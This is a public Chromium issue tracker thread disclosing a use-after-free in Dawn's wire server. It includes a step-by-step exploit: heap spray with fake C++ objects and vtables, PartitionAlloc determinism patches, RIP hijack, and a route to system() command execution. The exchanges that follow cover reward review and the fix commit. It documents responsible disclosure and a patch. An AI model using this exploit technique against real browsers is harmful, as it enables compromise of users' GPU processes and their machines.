This exploit demonstrates a use-after-free in the Dawn wire server within the GPU process that achieves attacker-controlled pointer dereference from a compromised renderer. The vulnerability exists in the Dawn wire server's device cleanup path: when a device is unregistered via the wire protocol, the 16-byte `DeviceInfo` structure is freed, but the native device's uncaptured-error callback retains a dangling `DeviceInfo*` as its userdata. The exploit reclaims the freed slot using a 16-byte `ChunkedCommand` allocation to overwrite `info->server` with `0x0000414141414141`. **No Chromium source modifications outside the renderer are required.** The controlled dereference is demonstrated by `Received signal 11 SEGV_MAPERR 4141414149d1` on stderr — the faulting address `0x4141414149d1` = attacker-chosen `info->server` (`0x414141414141`) + `mMutex` offset within the `Server` object.

## Exploit Flow

The exploit injects two wire commands in `Device::APIDestroy()`, followed by a third command from the PoC page. `FlushNow()` is skipped in `GPUDevice::destroy()` so all three commands land in a single `HandleCommands` batch on the GPU side.

**Step 1: Free** — `UnregisterObject(Device)` frees `DeviceInfo` (16 bytes). The wire server's `DoUnregisterObject` destroys `ObjectData<WGPUDevice>`, whose destructor frees the `std::unique_ptr<DeviceInfo>`. The native device remains alive because `WebGPUDecoderImpl` holds an additional reference.

**Step 2: Occupy** — `ChunkedCommand(id=0xDEAD, size=16, chunkSize=15)` reclaims the freed `DeviceInfo` slot with attacker-controlled content. When the GPU process handles this command, `ChunkedCommandHandler::HandleChunkedCommand` calls `AllocNoThrow<char>(16)` to allocate a 16-byte buffer. Because PartitionAlloc's per-slot-span freelist is LIFO, this allocation returns the exact slot that `DeviceInfo` just freed in Step 1. The handler then calls `memcpy` to copy the 15-byte `chunkData` payload into the buffer — the first 8 bytes overwrite what was `info->server` with `0x0000414141414141`. The `chunkSize` is set to 15 instead of 16 so that `remainingSize = size - chunkSize = 1`; because `remainingSize != 0`, the buffer is not freed — it stays alive in the `mChunkedCommands` map, waiting for the final 1-byte chunk that the attacker never sends.

**Step 3: Trigger** — `queue.writeBuffer(buffer, 99999, data)` from `exp_occupy.html` fires a validation error (offset exceeds buffer size). The native `QueueBase::APIWriteBuffer` calls `DeviceBase::HandleError`, which fires the uncaptured-error callback with the dangling `DeviceInfo*` as userdata. The callback reads `info->server = 0x0000414141414141` from the occupied slot and calls `info->server->GetGuard()`, which attempts to lock `mMutex` at `server + 0x880`. `pthread_mutex_lock` accesses `mMutex + 0x10` internally, producing the faulting address `0x414141414141 + 0x880 + 0x10 = 0x4141414149d1`.

## Crash Analysis

Chrome stderr:

```
Received signal 11 SEGV_MAPERR 4141414149d1

```

Call stack (from Chrome's crash handler):

```
#4 pthread_mutex_lock
#5 std::__Cr::mutex::lock()
#6 dawn::wire::server::Server::DoAdapterRequestDevice()::$_0::__invoke()
#7 dawn::native::DeviceBase::HandleError()
#8 dawn::native::QueueBase::APIWriteBuffer()

```

- Frame #6 is the UAF callback lambda in `ServerAdapter.cpp` that dereferences the dangling `DeviceInfo*`
- The faulting address `0x4141414149d1` = `info->server` (`0x414141414141`) + `Server::mMutex` offset (`0x880`) + `pthread_mutex_t` internal offset (`0x10`)

## Path to RIP Hijack

The controlled pointer dereference demonstrated above is one step away from full instruction pointer control. If `info->server` points to a fake `Server` object with valid (zero-filled) mutexes, the callback proceeds past `GetGuard()` into `OnUncapturedError` → `SerializeCommand` → `ChunkedCommandSerializer::SerializeCommandImpl`, which performs a virtual call on `mSerializer->GetCmdSpace()`. By placing a fake `Server` containing a self-referencing chain (fake `ChunkedCommandSerializer` → fake vtable → attacker-chosen function pointer) at a known heap address — achievable via the same `ChunkedCommand` spray mechanism with a heap address information leak — the attacker gains `rip` control. From there, replacing the `GetCmdSpace` vtable entry with `system()` and placing a command string at the `rdi`-passed address yields arbitrary command execution in the GPU process.

## Reproduce

Chromium commit: `1cf03136f094a16c5d029554426290ad46e58374`

OS: `Ubuntu 22.04 (x86_64), kernel 6.8`

Build: default release (`out/release/args.gn`: no special flags)

```
cd /path/to/chromium/src
git apply exp_occupy.diff
autoninja -C out/release chrome

out/release/chrome --enable-unsafe-webgpu --user-data-dir=./userdata exp_occupy.html

```

Expected stderr:

```
Received signal 11 SEGV_MAPERR 4141414149d1

```

### se...@gmail.com (2026-04-03)

**For Chrome VRP, this is the exploit that hijacks RIP for this vulnerability:**

## Exploit

This exploit demonstrates a use-after-free in the Dawn wire server within the GPU process that achieves fully controlled instruction pointer hijack from a compromised renderer. The vulnerability exists in the Dawn wire server's device cleanup path: when a device is unregistered via the wire protocol, the 16-byte `DeviceInfo` structure is freed, but the native device's uncaptured-error callback retains a dangling `DeviceInfo*` as its userdata. The exploit reclaims the freed slot using a 16-byte `ChunkedCommand` allocation to overwrite `info->server` with a pointer to a fake `Server` object placed at a known address by a prior 500×8KB `ChunkedCommand` heap spray. Two PartitionAlloc source modifications make the spray address deterministic. The controlled hijack is demonstrated by `Received signal 11 SEGV_MAPERR 414141414141` on stderr, and the GDB register dump confirming `rip = 0x414141414141`. This exploit assumes a heap address information leak is available; the PartitionAlloc modifications in the patch serve as a substitute for such a leak by fixing heap addresses to known values.

According to Chrome Release, this vulnerability has ITW (in-the-wild) exploitation cases. It is clearly exploitable. Due to time constraints, I did not complete the information leak, but PC hijack has already been demonstrated.

## Vulnerability

When a WebGPU device is unregistered via the wire protocol, the 16-byte `DeviceInfo` structure is freed, but the native device's uncaptured-error callback retains a dangling pointer to it.

**Freed object** (`third_party/dawn/src/dawn/wire/server/ObjectStorage.h:78`):

```
struct DeviceInfo {
    raw_ptr<Server> server;   // +0x00 (8 bytes)
    ObjectHandle self;        // +0x08 (8 bytes)
};

```

**Dangling callback** (`third_party/dawn/src/dawn/wire/server/ServerAdapter.cpp:63`):

```
desc.uncapturedErrorCallbackInfo = {
    nullptr,
    [](WGPUDevice const*, WGPUErrorType type, WGPUStringView message, void*, void* userdata) {
        DeviceInfo* info = static_cast<DeviceInfo*>(userdata);
        {
            auto serverGuard = info->server->GetGuard();
            info->server->OnUncapturedError(info->self, type, message);
        }
        info->server->Flush();
    },
    nullptr, device->info.get()};

```
## PartitionAlloc Determinism

Two PA source modifications make GPU heap addresses deterministic:

### 1. Fixed GigaCage base (`partition_address_space.cc`)

`mmap(0x500000000000, pool_size, PROT_NONE, MAP_FIXED_NOREPLACE, ...)` forces the PA GigaCage at a fixed virtual address. The regular pool occupies `0x500000000000–0x500400000000` (16GB) and the BRP pool `0x500400000000–0x500800000000` (16GB).

### 2. Isolated 10KB bucket (`partition_bucket.cc`)

The 0x2000-byte `AllocNoThrow` call lands in PA's 10240-byte (0x2800) bucket. The exploit modifies `AllocNewSuperPageSpan` so that this bucket always allocates SuperPages starting from `BRPPoolBase() + 0x200000000` = `0x500600000000`. This isolates the spray's SuperPages from other init allocations, making the first spray slot address deterministic at `0x500600004000` across all runs.

```
// partition_bucket.cc: AllocNewSuperPageSpan()
static uintptr_t s_10k_next = 0;
bool is_10k = (slot_size == 10240);
if (is_10k) {
    if (!s_10k_next)
        s_10k_next = PartitionAddressSpace::BRPPoolBase() + 0x200000000ULL;
    requested_address = s_10k_next;
}

```
## Exploit Flow

The exploit injects wire commands in `Device::APIDestroy()`:

**Step 1: Spray** — 500 × 8KB `ChunkedCommand` buffers, each containing a self-referencing fake `Server` object. The first chunk lands at `0x500600004000` (deterministic due to the isolated 10KB bucket).

**Step 2: Free** — `UnregisterObject(Device)` frees `DeviceInfo` (16 bytes).

**Step 3: Occupy** — `ChunkedCommand(id=0xDEAD, size=16, chunkSize=15)` reclaims the freed `DeviceInfo` slot with attacker-controlled content. When the GPU process handles this command, `ChunkedCommandHandler::HandleChunkedCommand` calls `AllocNoThrow<char>(16)` to allocate a 16-byte buffer. Because PartitionAlloc's per-slot-span freelist is LIFO, this allocation returns the exact slot that `DeviceInfo` just freed in Step 2. The handler then calls `memcpy` to copy the 15-byte `chunkData` payload into the buffer — the first 8 bytes overwrite what was `info->server` with `0x500600004000` (the address of a spray chunk containing the fake Server). The `chunkSize` is set to 15 instead of 16 so that `remainingSize = size - chunkSize = 1`; because `remainingSize != 0`, the buffer is not freed — it stays alive in the `mChunkedCommands` map, waiting for the final 1-byte chunk that the attacker never sends.

**Step 4: Trigger** — `queue.writeBuffer(buffer, 99999, data)` from `exp.html` fires a validation error → uncaptured-error callback → dereferences `info->server = 0x500600004000` → fake Server → virtual call → `rip = 0x414141414141`.

`FlushNow()` is skipped in `GPUDevice::destroy()` so all commands land in a single `HandleCommands` batch.

## From Occupy to RIP Control

After the occupy in Step 3, the freed `DeviceInfo` slot now contains `info->server = 0x500600004000`, pointing into a spray chunk filled with fake C++ objects. Step 4 triggers a validation error that fires the dangling callback. The following call chain executes in the GPU process, each step dereferencing attacker-controlled data:

### 1. UAF callback reads `info->server`

The callback lambda in `ServerAdapter.cpp` casts the dangling `userdata` to `DeviceInfo*` and reads `info->server`:

```
DeviceInfo* info = static_cast<DeviceInfo*>(userdata);
auto serverGuard = info->server->GetGuard();  // Step 2 below
info->server->OnUncapturedError(info->self, type, message);  // Step 3 below

```

`info->server` now reads `0x500600004000` — the start of a spray chunk. The compiler emits:

```
mov  (%r9), %r12          ; r12 = info->server = 0x500600004000
add  $0x880, %r12         ; r12 = &server->mMutex = 0x500600004880
call mutex::lock()        ; pthread_mutex_lock(0x500600004880)

```

The spray chunk is zero-filled, so `mMutex` at `+0x880` is a zeroed `pthread_mutex_t`, which `pthread_mutex_lock` treats as an unlocked mutex. The lock succeeds.

### 2. `OnUncapturedError` accesses `mSerializer`

With the mutex held, the callback calls `info->server->OnUncapturedError()` (`ServerDevice.cpp:35`):

```
void Server::OnUncapturedError(ObjectHandle device, WGPUErrorType type, WGPUStringView message) {
    ReturnDeviceUncapturedErrorCallbackCmd cmd;
    cmd.device = device;
    cmd.type = type;
    cmd.message = message;
    SerializeCommand(cmd);  // → mSerializer->SerializeCommand(cmd)
}

```

`SerializeCommand` is an inline method (`Server.h:223`) that calls `mSerializer->SerializeCommand(cmd)`. `mSerializer` is a `MutexProtected<ChunkedCommandSerializer>` at `Server+0xB50`. `MutexProtected` wraps the `ChunkedCommandSerializer` with its own internal mutex at `Server+0xB28`. This internal mutex is also zero-filled, so the lock succeeds.

### 3. `ChunkedCommandSerializer::SerializeCommandImpl` dereferences `mSerializer`

The unwrapped `ChunkedCommandSerializer` contains two fields (`ChunkedCommandSerializer.h:154`):

```
raw_ptr<CommandSerializer> mSerializer;  // +0x00 within ChunkedCommandSerializer
size_t mMaxAllocationSize;               // +0x08

```

At `Server+0xB50`, `mSerializer` holds the value we placed there: `0x500600004C00`. At `Server+0xB58`, `mMaxAllocationSize` holds `0xFFFFFFFFFFFFFFFF`, ensuring the `requiredSize <= mMaxAllocationSize` check at line 124 passes and the fast path is taken:

```
// ChunkedCommandSerializer.h:124
if (requiredSize <= mMaxAllocationSize) {
    char* allocatedBuffer = static_cast<char*>(mSerializer->GetCmdSpace(requiredSize));

```
### 4. Virtual call on fake `CommandSerializer` → RIP hijack

`CommandSerializer` is a polymorphic class with a virtual `GetCmdSpace` method (`Wire.h:51`):

```
class CommandSerializer {
  public:
    virtual void* GetCmdSpace(size_t size) = 0;  // vtable slot [2] at +0x10
    ...
};

```

The compiler emits:

```
mov  (%r14), %rdi         ; rdi = mSerializer = 0x500600004C00 (fake CommandSerializer)
mov  (%rdi), %rax         ; rax = *(0x500600004C00) = vtable ptr = 0x500600004D00
call *0x10(%rax)          ; rip = *(0x500600004D00 + 0x10) = *(0x500600004D10) = 0x414141414141

```

The spray chunk contains:

- `+0xC00`: fake `CommandSerializer` object, first 8 bytes = vtable pointer → `0x500600004D00`
- `+0xD00`: fake vtable, slot `[0]` and `[1]` unused
- `+0xD10`: fake vtable slot `[2]` (`GetCmdSpace`) = `0x0000414141414141`

The `call *0x10(%rax)` instruction transfers control to `0x414141414141`.

### Summary of spray chunk layout

| Offset | Role | Value |
| --- | --- | --- |
| `+0x000`–`+0xB4F` | Zeros (includes `mMutex` at +0x880, internal mutex at +0xB28) | 0 = unlocked |
| `+0xB50` | `ChunkedCommandSerializer.mSerializer` (raw\_ptr) | `0x500600004C00` |
| `+0xB58` | `ChunkedCommandSerializer.mMaxAllocationSize` | `0xFFFFFFFFFFFFFFFF` |
| `+0xC00` | Fake `CommandSerializer` vtable pointer | `0x500600004D00` |
| `+0xD10` | Fake vtable `GetCmdSpace` slot (vtable + 0x10) | `0x0000414141414141` |

## Crash Analysis

GDB output:

```
Thread 1 "chrome" received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
rip            0x414141414141      0x414141414141
rax            0x500600004d00
rdi            0x500600004c00
rbx            0x500600004b50
#0  0x0000414141414141 in ?? ()
#1  ChunkedCommandSerializer::SerializeCommandImpl()
#2  Server::OnUncapturedError()
#3  Server::DoAdapterRequestDevice()::$_0::__invoke()
#4  DeviceBase::HandleError()
#5  QueueBase::APIWriteBuffer()
#6  NativeQueueWriteBuffer()
#7  Server::DoQueueWriteBuffer()

```

- **RIP** = `0x414141414141` — the attacker's chosen value from vtable slot `GetCmdSpace`
- **RBX** = `0x500600004b50` — `&mSerializer` within the fake Server (spray chunk + 0xB50), matches the `lea 0xb50(%rbx)` addressing
- **RDI** = `0x500600004c00` — fake `CommandSerializer` pointer (spray chunk + 0xC00), the `this` argument to `GetCmdSpace`
- **RAX** = `0x500600004d00` — fake vtable pointer (spray chunk + 0xD00), loaded from the first 8 bytes of the fake `CommandSerializer`
- Frame #1 = `SerializeCommandImpl`, which issued `call *0x10(%rax)`
- Frame #3 = the UAF callback lambda that read the dangling `DeviceInfo*`

## Reproduce

Chromium commit: `1cf03136f094a16c5d029554426290ad46e58374`

OS: `Ubuntu 22.04 (x86_64), kernel 6.8`

Build: default release (`out/release/args.gn`: no special flags)

```
is_asan = false
is_debug = false
dcheck_always_on = false

```
```
cd /path/to/chromium/src
git apply exp.diff
autoninja -C out/release chrome

out/release/chrome \
  --enable-unsafe-webgpu \
  --user-data-dir=./userdata exp.html

```

Expected stderr:

```
Received signal 11 SEGV_MAPERR 414141414141

```

GDB verification:

```
sudo gdb attach GPU_PID

handle SIGSEGV stop nopass
handle SIGTERM nostop noprint
handle SIGUSR1 nostop noprint
handle SIGUSR2 nostop noprint
handle SIG34 nostop noprint
handle SIG35 nostop noprint
c

```

### se...@gmail.com (2026-04-04)

**For Chrome VRP, meanwhile, according to my tests, `exp_occupy.html` and `exp_occupy.diff` works on macOS as well.**

Chromium commit: `1cf03136f094a16c5d029554426290ad46e58374`

OS: `macOS Tahoe 26.2`

Reproduce(WebGPU enabled by default):

```
git apply exp_occupy.patch
ninja -C out/release chrome

./out/release/Chromium.app/Contents/MacOS/Chromium --user-data-dir=./userdata exp_occupy.html

```

### pe...@google.com (2026-04-16)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### vi...@google.com (2026-04-16)

1. <https://dawn-review.git.corp.google.com/c/dawn/+/303155>
2. Medium - Two source files had conflicts but were relatively simple to solve. Details are on the CL commit message
3. 146 and 147
4. Yes

### aj...@google.com (2026-04-21)

Note: the evidence of controlled r/w and exploit use the unsafe webgpu flag which is not a standard configuration. Please let us know if you can achieve the exploit or rw without this flag.

### se...@gmail.com (2026-04-21)

Hi! Thank you for reviewing! I'd like to clarify that `--enable-unsafe-webgpu` is not a prerequisite for this vulnerability or its exploitation — it is only needed to enable the WebGPU API on `Linux`.

As shown in `gpu/config/gpu_finch_features.cc`, `kWebGPUService` is `FEATURE_ENABLED_BY_DEFAULT` on `macOS`, `Windows`, `ChromeOS`, and `Android`. On these platforms, WebGPU is available to any website by default, with no special flags required. The vulnerability is therefore exploitable under standard Chrome configurations affecting the vast majority of the user base.

I used `Linux` with `--enable-unsafe-webgpu` during development purely for debugging convenience. The heap occupation technique is platform-independent. For example, As shown in the `macOS` screenshot (`mac_exp_occupy.png`) attached in my earlier comment, the exploit successfully hijacks PC at 0x41414141... in the GPU process on a release build chrome launched without any extra flags:

```
git apply exp_occupy.patch
ninja -C out/release chrome

./out/release/Chromium.app/Contents/MacOS/Chromium --user-data-dir=./userdata exp_occupy.html

```

The root cause is entirely flag-independent. Both the ASAN-confirmed UAF and the controlled exploitation work under default configurations on platforms covering the vast majority of Chrome users.

### sp...@google.com (2026-04-22)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $15000.00 for this report.

Rationale for this decision:
Controlled r/w and exploit use the unsafe webgpu flag which is not a standard configuration


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### se...@gmail.com (2026-04-22)

Hi Chrome VRP Panel,

Thank you for reviewing my report. However, I believe the reward rationale contains a factual error that materially affected the panel's assessment, and I respectfully request a re-evaluation.

The panel's rationale is incorrect.

The stated rationale is: "Controlled r/w and exploit use the unsafe webgpu flag which is not a standard configuration."

This is factually wrong. The `--enable-unsafe-webgpu` flag is only required on `Linux` to enable the WebGPU API. As defined in `gpu/config/gpu_finch_features.cc`, `kWebGPUService` is `FEATURE_ENABLED_BY_DEFAULT` on `macOS`, `Windows`, `ChromeOS`, and `Android` — the platforms covering the vast majority of Chrome's user base. On these platforms, `WebGPU` is available to any website by default, with no flags required.

I already clarified this in [comment #17](https://issues.chromium.org/issues/491518608#comment17) and [comment #21](https://issues.chromium.org/issues/491518608#comment21) on the bug, and provided a macOS screenshot (`mac_exp_occupy.png`) demonstrating the controlled pointer dereference exploit (exp\_occupy) succeeding on a release build launched with zero extra flags:

```
./out/release/Chromium.app/Contents/MacOS/Chromium --user-data-dir=./userdata exp_occupy.html

```

The flag was used during development on Linux purely for debugging convenience. The root cause, the exploitation technique, and the heap occupation are entirely independent of both the platform and the flag. This exploit is cross-platform.

I would also appreciate it if the panel could reproduce the exploit on macOS under a default configuration (no extra flags) to verify that the exploitation works as demonstrated, and re-evaluate the report accordingly.

### aj...@google.com (2026-04-23)

panel: see comment 23

### pe...@google.com (2026-04-23)

Note WebGPU is also now default enabled for Linux on Intel and Nvidia devices. (via interop feature).

### sp...@google.com (2026-05-04)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $55000.00 for this report.

Rationale for this decision:
Controlled r/w in gpu, demonstrated on non-Android. Sorry we missed this the first time around!


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### dx...@google.com (2026-05-04)

Project: dawn  

Branch:  chromium/7559  

Author:  Lokbondo Kung [lokokung@google.com](mailto:lokokung@google.com)  

Link:    <https://dawn-review.googlesource.com/303155>

[M144-LTS] [dawn][wire] Ensure that Devices on the Server always call Destroy.

---


Expand for full commit details
```
     
    M144-LTS conflicts: 
        generator/templates/dawn/wire/server/ServerDoers.cpp and 
        src/dawn/wire/server/Server.cpp: mProcs before was not a 
        pointer, so some references of it had to be fixed. 
     
    - Because the wire server creates and manages callback information 
      for all Devices, we need to ensure that all Devices' callbacks 
      are fired before the server goes away. Otherwise, if the server 
      is deleted, and somehow there is an outstanding reference to the 
      backing native Device, the callbacks can happen and reference 
      freed memory. 
    - Updates Wire testing infrastructure to: 
      1) Use a NiceMock for the ProcTable to avoid overly strict tests 
         that end up adding a lot implementation detail expectations. 
      2) Add expecatations that successfully created Devices on the 
         server should call Destroy to ensure that their callbacks are 
         all flushed. 
      3) Remove some tech-debt/unused members and functions after the 
         change. 
     
    Bug: 491518608 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/297136 
    Reviewed-by: Kai Ninomiya <kainino@chromium.org> 
    Commit-Queue: Loko Kung <lokokung@google.com> 
    Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
    Change-Id: I0a9a2619ee2cb8812a14c1702edf7a95b4158be7 
    No-Try: true 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/303155 
    Reviewed-by: Loko Kung <lokokung@google.com> 
    Owners-Override: Achuith Bhandarkar <achuith@google.com> 
    Reviewed-by: Achuith Bhandarkar <achuith@google.com> 
    Commit-Queue: Tiago Vignatti (xWF) <vignatti@google.com>

```

---

Files:

- M `generator/templates/dawn/wire/server/ServerDoers.cpp`
- M `generator/templates/mock_api.cpp`
- M `generator/templates/mock_api.h`
- M `src/dawn/tests/unittests/wire/WireAdapterTests.cpp`
- M `src/dawn/tests/unittests/wire/WireBufferMappingTests.cpp`
- M `src/dawn/tests/unittests/wire/WireDisconnectTests.cpp`
- M `src/dawn/tests/unittests/wire/WireQueueTests.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.h`
- M `src/dawn/wire/server/Server.cpp`
- M `src/dawn/wire/server/Server.h`

---

Hash: 00c09fbe8ff24fda652803186286ea5c5edf4c21  

Date: Mon May 4 18:34:26 2026


---

### cl...@appspot.gserviceaccount.com (2026-05-05)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5343772556689408.

### ch...@google.com (2026-06-27)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/491518608)*
